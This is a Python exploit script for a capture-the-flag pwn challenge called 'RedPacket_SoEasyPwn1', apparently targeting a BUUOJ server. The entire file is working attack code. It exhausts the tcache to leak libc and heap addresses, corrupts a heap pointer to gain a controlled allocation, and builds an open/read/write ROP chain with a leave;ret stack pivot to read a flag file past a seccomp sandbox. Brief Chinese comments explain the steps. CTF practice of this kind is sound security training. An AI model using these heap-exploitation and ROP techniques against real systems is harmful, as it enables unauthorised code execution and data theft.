# -*- coding: utf-8 -*-
from PwnContext.core import *
binary = './RedPacket_SoEasyPwn1'
debug_libc = './libc-2.29.so'
elf = ELF(binary)
libc = ELF(debug_libc)
local = 0

if local == 1 :
    io = remote("node3.buuoj.cn","26413")
else:
    ctx.binary = binary
    ctx.remote_libc = debug_libc
    ctx.debug_remote_libc = True
    io = ctx.start()


def choice( idx):
    io.sendlineafter( "input: ", str(idx))

def lg(name, val):
    log.info(name+" : "+hex(val))

def add( idx, size_idx, data):
    choice( 1)
    io.sendlineafter( "packet idx: ", str(idx))
    io.sendlineafter( "4.0x400): ", str(size_idx))
    io.sendafter( "content: ", data)

def remove( idx):
    choice( 2)
    io.sendlineafter( "idx: ", str(idx))
    io.recvuntil( "Done!\n")

def edit( idx, data):
    choice( 3)
    io.sendlineafter( "idx: ", str(idx))
    io.sendafter( "content: ", data)
    io.recvuntil( "Done!\n")

def show( idx):
    choice( 4)
    io.sendlineafter( "idx: ", str(idx))


leave_ret=0x000000000003ef85
pop_rdi=0x00000000000219a0
pop_rsi=0x0000000000024395
pop_rdx=0x0000000000001b9a
push_rax=0x000000000001f198

# ROPgadget --binary libc-2.29.so | grep "leave"
# ROPgadget --binary libc-2.29.so --string "/bin/sh"
# ROPgadget --binary libc-2.29.so --ropchain
# ROPgadget --binary libc-2.29.so | grep "pop rdi"

for i in range(2,9):
    add(i,2, 'a')
for i in range(2,9):
    remove(i)
add(2,2,'a')     # calloc 不会从tcache bin中去取
add(3,4,'aa')
remove(2)            # free之后 tcache bin已满进入unsort bin
show(2)
main_arena = u64(io.recv(6).ljust(8, '\x00'))
libc.address = main_arena - 0x3b3ca0
log.success('libc base 0x%x' %(libc.address))

show(6)
heap_address = u64(io.recv(6).ljust(8, '\x00')) & ~0xfff
log.success('heap address 0x%x' %(heap_address))
heap_ptr=heap_address-0x1000+0x260



rop=p64(libc.address+pop_rdi)+p64(heap_address+0xe80+0x200)+p64(libc.address+pop_rsi)+p64(0)+p64(libc.sym['open'])
# open(file_name,0(flags));
rop+=p64(libc.address+pop_rdi)+p64(3)+p64(libc.address+pop_rsi)+p64(heap_address+0xe80+0x200)+p64(libc.address+pop_rdx)+p64(0x100)+p64(libc.sym['read'])
# read(3,file_name,0x100)
rop+=p64(libc.address+pop_rdi)+p64(1)+p64(libc.address+pop_rsi)+p64(heap_address+0xe80+0x200)+p64(libc.address+pop_rdx)+p64(0x100)+p64(libc.sym['write'])
# write(1,file_name,0x100)
add(3,4,rop.ljust(0x200,'\x00')+'/ctf/work/red/flag'+'\x00')
edit(1,p64(heap_ptr))
remove(4)
add(1,4,'aa')
add(1,4,'\xff'*(0x400-0x30)+p64(0)*4+p64(0x7f0000000001))  # 过检测
sleep(0.1)
choice(666)
io.sendafter( "say?", 'a'*0x80+p64(heap_address+0xe80-8)+p64(libc.address+leave_ret))  # 栈迁移修改ret为leave
io.interactive()

# seccomp-tools dump ./filename
# 检测沙箱禁用的，A==execve 就是已经禁用的函数
